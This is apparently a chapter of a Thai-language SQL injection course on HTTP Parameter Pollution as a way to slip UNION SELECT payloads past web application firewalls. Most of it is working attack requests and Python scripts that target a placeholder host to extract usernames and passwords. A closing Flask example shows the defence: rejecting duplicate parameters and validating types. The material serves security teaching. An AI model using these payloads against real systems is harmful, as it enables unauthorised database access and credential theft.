# Part 056: HTTP Parameter Pollution และ SQL Injection

## ภาพรวม

HTTP Parameter Pollution (HPP) ใช้เพื่อ split WAF detection และ inject เข้าไปในหลายเลเยอร์

**ขั้นตอนที่ 911-925**

---

## 911. HTTP Parameter Pollution

```
# HPP = ส่ง parameter เดียวกันหลายครั้ง

# WAF เห็น: ?id=1 &id=' UNION SELECT
# WAF ตรวจสอบ id[0]=1 (safe) -> pass
# Backend รวม: id = '1' OR '...' UNION SELECT

GET /page?id=1&id=' UNION SELECT NULL,username,password FROM users--

# PHP ใช้ last value: id = "' UNION SELECT..."
# ASP.NET รวม: id = "1,' UNION SELECT..."
# Express.js ใช้ array: id = ['1', "' UNION SELECT..."]
```

---

## 912. HPP แตกต่างตาม Platform

```python
import requests

def test_hpp_sqli(url: str):
    """Test HTTP Parameter Pollution for SQL injection bypass"""
    
    base_payload = "' UNION SELECT 1,username,password FROM users-- -"
    
    # PHP ใช้ last value
    test_php = requests.get(url, params=[
        ('id', '1'),
        ('id', base_payload)
    ])
    
    # ASP.NET รวมด้วย comma
    test_asp = requests.get(url, params=[
        ('id', '1'),
        ('id', base_payload.replace("' UNION", " UNION"))
    ])
    
    # แยก payload เป็น 2 ส่วน (WAF bypass)
    part1 = "' UNION SELECT "
    part2 = "1,username,password FROM users-- -"
    test_split = requests.get(url, params=[
        ('id', part1),
        ('id2', part2)  # ถ้า server concat id+id2
    ])
    
    for name, r in [('PHP (last)', test_php), 
                    ('ASP.NET (concat)', test_asp),
                    ('Split payload', test_split)]:
        content = r.text.lower()
        if 'admin' in content or 'root' in content or r.status_code == 200:
            print(f"[+] Possible HPP bypass with {name}")
        else:
            print(f"[-] {name}: {r.status_code}")

# test_hpp_sqli('http://target/page')
```

---

## 913. HPP ใน JSON API

```python
import requests
import json

# JSON duplicate keys
json_hpp_1 = '{"id": 1, "id": "\' UNION SELECT NULL,username,password FROM users-- -"}'
# Python JSON parser ใช้ last value
# แต่ server-side parser บางตัวใช้ first value

r = requests.post('http://target/api/item',
                  data=json_hpp_1,
                  headers={'Content-Type': 'application/json'})
print(r.status_code, r.text[:200])

# Array form HPP:
data = {'id[]': ['1', "' UNION SELECT 1,2,3-- -"]}
r2 = requests.post('http://target/api/item', data=data)
print(r2.status_code, r2.text[:200])
```

---

## 914. การป้องกัน HPP

```python
from flask import Flask, request, abort

app = Flask(__name__)

def get_single_param(params, key):
    """Get single value - prevent HPP by rejecting duplicates"""
    values = params.getlist(key)
    if len(values) > 1:
        abort(400, f"Duplicate parameter: {key}")
    return values[0] if values else None

@app.route('/page')
def page():
    # ป้องกัน HPP
    item_id = get_single_param(request.args, 'id')
    if not item_id:
        abort(400)
    
    # ตรวจสอบว่าเป็นตัวเลข
    try:
        item_id = int(item_id)
    except ValueError:
        abort(400, "Invalid id")
    
    return f"Item {item_id}"
```

---

## สรุป

HTTP Parameter Pollution:
- **PHP** - ใช้ last value ของ duplicate
- **ASP.NET** - รวมด้วย comma
- **Express.js** - ใช้ array
- **JSON** - duplicate keys บาง parsers ignore
- **Prevention** - reject duplicate parameters, validate type

---

*Part 056 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
